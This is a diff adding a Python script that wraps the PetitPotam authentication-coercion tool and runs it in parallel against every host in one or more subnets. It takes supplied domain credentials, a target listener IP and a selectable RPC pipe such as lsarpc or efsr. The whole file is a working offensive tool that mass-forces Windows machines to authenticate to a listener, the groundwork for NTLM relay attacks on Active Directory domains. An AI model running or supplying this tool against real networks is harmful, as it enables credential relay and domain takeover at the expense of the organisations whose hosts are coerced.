@@ -1,0 +1,85 @@
+import ipaddress
+import subprocess
+import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import logging
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def run_command(command):
+    """Запускает команду и возвращает результат."""
+    try:
+        logging.info(f"Running command: {' '.join(command)}")
+        result = subprocess.run(command, capture_output=True, text=True)
+        if result.returncode == 0:
+            logging.info(f"Success: {result.stdout}")
+        else:
+            logging.error(f"Error: {result.stderr}")
+    except Exception as e:
+        logging.error(f"Exception occurred: {e}")
+
+def run_petitpotam(networks, domain, username, password, target_ip, threads, pipe):
+    commands = []
+
+    for network in networks:
+        network_obj = ipaddress.ip_network(network, strict=False)
+        for ip in network_obj.hosts():
+            ip_str = str(ip)
+            command = [
+                "python3",
+                "PetitPotam.py",
+                "-d", domain,
+                "-u", username,
+                "-p", password,
+                target_ip,
+                ip_str,
+                "-pipe", pipe
+            ]
+            commands.append(command)
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        future_to_command = {executor.submit(run_command, cmd): cmd for cmd in commands}
+        for future in as_completed(future_to_command):
+            cmd = future_to_command[future]
+            try:
+                future.result()
+            except Exception as e:
+                logging.error(f"Command {cmd} generated an exception: {e}")
+
+def load_networks_from_file(file_path):
+    """Загружает подсети из файла."""
+    try:
+        with open(file_path, 'r') as file:
+            networks = [line.strip() for line in file if line.strip()]
+        return networks
+    except Exception as e:
+        logging.error(f"Exception occurred while reading the file: {e}")
+        return []
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Run PetitPotam.py with a subnet mask or a list of subnet masks from a file")
+    parser.add_argument("-n", "--network", help="Network with mask (e.g., 192.168.0.0/24)")
+    parser.add_argument("-f", "--file", help="File with list of networks")
+    parser.add_argument("-d", "--domain", required=True, help="Domain")
+    parser.add_argument("-u", "--username", required=True, help="Username")
+    parser.add_argument("-p", "--password", required=True, help="Password")
+    parser.add_argument("-t", "--target_ip", required=True, help="Target IP address")
+    parser.add_argument("--threads", type=int, default=4, help="Number of parallel threads")
+    parser.add_argument("-pipe", choices=["efsr", "lsarpc", "samr", "netlogon", "lsass", "all"], default="lsarpc", help="Pipe to use")
+
+    args = parser.parse_args()
+
+    networks = []
+
+    if args.network:
+        networks.append(args.network)
+
+    if args.file:
+        file_networks = load_networks_from_file(args.file)
+        networks.extend(file_networks)
+
+    if not networks:
+        logging.error("No networks provided. Please specify a network or a file with networks.")
+    else:
+        run_petitpotam(networks, args.domain, args.username, args.password, args.target_ip, args.threads, args.pipe)
